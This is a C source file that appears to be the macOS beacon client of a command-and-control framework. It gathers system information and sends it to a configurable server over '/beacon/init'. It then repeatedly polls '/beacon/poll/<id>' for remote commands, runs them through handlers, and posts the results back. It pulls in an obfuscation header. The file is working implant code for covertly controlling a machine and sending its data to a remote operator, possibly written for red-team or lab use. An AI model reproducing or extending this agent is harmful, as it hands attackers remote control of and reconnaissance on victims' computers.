#include "client.h"
#include <CFNetwork/CFNetwork.h>
#include <CoreFoundation/CoreFoundation.h>
#include <runtime/darwin.h>
#include <runtime/foundation.h>
#include <runtime/kit.h>
#include <runtime/messaging.h>
#include <runtime/obf.h>
#include <runtime/xspring.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "commands.h"
#include "network.h"
#include "protocol.h"
#include "sysinfo.h"

#ifdef DEBUG
#include <stdarg.h>
static inline void debug_log(const char* fmt, ...) {
  va_list args;
  va_start(args, fmt);
  fprintf(stderr, "[DEBUG] ");
  vfprintf(stderr, fmt, args);
  fprintf(stderr, "\n");
  va_end(args);
}
#define DEBUG_LOG(...) debug_log(__VA_ARGS__)
#else
#define DEBUG_LOG(...) ((void)0)
#endif

// Global state
static bool should_run = true;

// Forward declarations
static bool load_config(const char* config_path, client_config_t* config);
static bool send_ping(ClientContext* ctx);
static void handle_command(const char* command);

// Load configuration from file
static bool load_config(const char* config_path, client_config_t* config) {
  FILE* fp = fopen(config_path, "r");
  if (!fp) {
    // If config doesn't exist, use defaults
    strncpy(config->server_host, "127.0.0.1", sizeof(config->server_host) - 1);
    config->server_port = 4444;
    config->ping_interval = 3;
    snprintf(config->client_id, sizeof(config->client_id), "client_%d",
             getpid());
    return false;
  }

  char line[512];
  while (fgets(line, sizeof(line), fp)) {
    char key[64], value[256];
    if (sscanf(line, "%63[^=]=%255s", key, value) == 2) {
      if (strcmp(key, "server_host") == 0) {
        strncpy(config->server_host, value, sizeof(config->server_host) - 1);
      } else if (strcmp(key, "server_port") == 0) {
        config->server_port = atoi(value);
      } else if (strcmp(key, "ping_interval") == 0) {
        config->ping_interval = atoi(value);
      } else if (strcmp(key, "client_id") == 0) {
        strncpy(config->client_id, value, sizeof(config->client_id) - 1);
      }
    }
  }
  fclose(fp);
  return true;
}

static bool send_init(ClientContext* ctx) {
  SystemInfo info;
  if (!GetAllSystemInfo(&ctx->darwin, &info)) {
    DEBUG_LOG("Failed to get system information");
    return false;
  }

  ProtocolBuilder* builder = protocol_create_init(ctx->config.client_id, &info);
  if (!builder) {
    DEBUG_LOG("Failed to create init message");
    return false;
  }

  protocol_add_uint(builder, "timestamp", (unsigned int)time(NULL));
  protocol_add_uint(builder, "pid", (unsigned int)getpid());

  if (protocol_has_error(builder)) {
    DEBUG_LOG("Failed to build init message");
    protocol_builder_destroy(builder);
    return false;
  }

  http_request_t req = {.url_path = "/beacon/init",
                        .body = protocol_get_message(builder),
                        .body_length = protocol_get_length(builder)};

  http_response_t resp = {0};
  NetworkError error = send_http_request(ctx, &req, &resp);

  bool success = false;
  if (error == NETWORK_SUCCESS) {
    // Check for valid response
    if (resp.status_code == HTTP_STATUS_OK) {
      DEBUG_LOG("Initialization successful");
      success = true;
    } else {
      DEBUG_LOG("Server returned error status: %d", resp.status_code);
    }
  } else {
    DEBUG_LOG("Network error during initialization: %d", error);
  }

  // Cleanup
  protocol_builder_destroy(builder);
  free_http_response(&resp);

  return success;
}

static void handle_command(const char* command) {
  if (!command)
    return;

  if (strncmp(command, "STOP", 4) == 0) {
    should_run = false;
  }
  printf("Received command: %s\n", command);
}

static bool send_ping(ClientContext* ctx) {
  ProtocolBuilder* builder = protocol_create_ping(ctx->config.client_id);
  if (!builder) {
    DEBUG_LOG("Failed to create ping message");
    return false;
  }

  protocol_add_uint(builder, "timestamp", (unsigned int)time(NULL));

  http_request_t req = {.url_path = "/",
                        .body = protocol_get_message(builder),
                        .body_length = protocol_get_length(builder)};

  http_response_t resp = {0};
  NetworkError error = send_http_request(ctx, &req, &resp);

  bool success = false;
  if (error == NETWORK_SUCCESS) {
    if (resp.status_code == HTTP_STATUS_OK) {
      if (resp.data) {
        DEBUG_LOG("Ping response: %s", resp.data);
      }
      success = true;
    } else {
      DEBUG_LOG("Ping failed with status code: %d", resp.status_code);
    }
  } else {
    DEBUG_LOG("Ping failed with network error: %d", error);
  }

  protocol_builder_destroy(builder);
  free_http_response(&resp);
  return success;
}

static bool check_for_commands(ClientContext* ctx) {
  DEBUG_LOG("Checking for commands for client %s", ctx->config.client_id);

  char url[256];
  snprintf(url, sizeof(url), "/beacon/poll/%s", ctx->config.client_id);
  DEBUG_LOG("Polling URL: %s", url);

  http_request_t req = {.url_path = url, .body = NULL, .body_length = 0};

  http_response_t resp = {0};
  NetworkError error = send_http_request(ctx, &req, &resp);

  if (error != NETWORK_SUCCESS) {
    DEBUG_LOG("Command poll failed with network error: %d", error);
    return false;
  }

  if (resp.status_code == HTTP_STATUS_NO_CONTENT) {
    DEBUG_LOG("No pending commands");
    free_http_response(&resp);
    return true;
  }

  if (resp.status_code != HTTP_STATUS_OK || !resp.data) {
    DEBUG_LOG("Invalid response: status=%d", resp.status_code);
    free_http_response(&resp);
    return false;
  }

  DEBUG_LOG("Parsing response: %s", resp.data);

  char* command = NULL;
  char command_id[32] = {0};  // Buffer for command ID string
  char* lines = strdup(resp.data);
  if (!lines) {
    free_http_response(&resp);
    return false;
  }

  // Parse command and command ID
  char* line = strtok(lines, "\n");
  while (line) {
    if (strncmp(line, "command: ", 9) == 0) {
      command = strdup(line + 9);
    } else if (strncmp(line, "id: ", 4) == 0) {
      strncpy(command_id, line + 4, sizeof(command_id) - 1);
    }
    line = strtok(NULL, "\n");
  }

  free(lines);
  free_http_response(&resp);

  if (command && command_id[0]) {  // If we have both command and ID
    DEBUG_LOG("Found command: %s (ID: %s)", command, command_id);
    command_handler handler = get_command_handler(command);
    if (handler) {
      DEBUG_LOG("Found handler for command: %s", command);
      char* result = handler(&ctx->darwin);
      if (result) {
        DEBUG_LOG("Command execution result: %s", result);

        // Create response using our protocol
        ProtocolBuilder* builder =
            protocol_create_command_response(command_id, result);
        if (builder) {
          // Send response back to server
          char response_url[256];
          snprintf(response_url, sizeof(response_url), "/beacon/response/%s/%s",
                   ctx->config.client_id, command_id);

          http_request_t resp_req = {
              .url_path = response_url,
              .body = protocol_get_message(builder),
              .body_length = protocol_get_length(builder)};

          http_response_t resp_resp = {0};
          if (send_http_request(ctx, &resp_req, &resp_resp) ==
              NETWORK_SUCCESS) {
            DEBUG_LOG("Command response sent successfully");
          } else {
            DEBUG_LOG("Failed to send command response");
          }

          protocol_builder_destroy(builder);
          free_http_response(&resp_resp);
        }
        free(result);
      }
    }
    free(command);
  }

  return true;
}

int main(int argc, char* argv[]) {
  DEBUG_LOG("Starting client application");

  ClientContext ctx = {0};

  if (!InitializeDarwinApi(&ctx.darwin)) {
    printf("Failed to initialize Darwin API\n");
    return 1;
  }

  ctx.rtk = rtk_context_create();
  if (!ctx.rtk) {
    DEBUG_LOG("Failed to create runtime context");
    fprintf(stderr, "Failed to create runtime context\n");
    return 1;
  }

  const char* config_path = (argc > 1) ? argv[1] : "client.conf";
  DEBUG_LOG("Using config path: %s", config_path);

  if (!load_config(config_path, &ctx.config)) {
    DEBUG_LOG("Configuration loaded from file");
  } else {
    DEBUG_LOG("Using default configuration");
  }

  printf("Client started (ID: %s)\n", ctx.config.client_id);
  printf("Connecting to %s:%d\n", ctx.config.server_host,
         ctx.config.server_port);
  DEBUG_LOG("Client initialized with ID: %s", ctx.config.client_id);
  DEBUG_LOG("Server target: %s:%d", ctx.config.server_host,
            ctx.config.server_port);

  // Try to initialize
  if (!send_init(&ctx)) {
    DEBUG_LOG("Initialization failed");
    fprintf(stderr, "Failed to initialize with server\n");
    return 1;
  }

  // Start ping loop
  while (should_run) {
    if (!send_ping(&ctx)) {
      DEBUG_LOG("Ping failed");
      printf("Failed to connect to server, retrying in %d seconds\n",
             ctx.config.ping_interval);
    } else {
      check_for_commands(&ctx);
    }
    sleep(ctx.config.ping_interval);
  }

  DEBUG_LOG("Shutting down client");
  rtk_context_destroy(ctx.rtk);
  DEBUG_LOG("Cleanup complete");
  return 0;
}
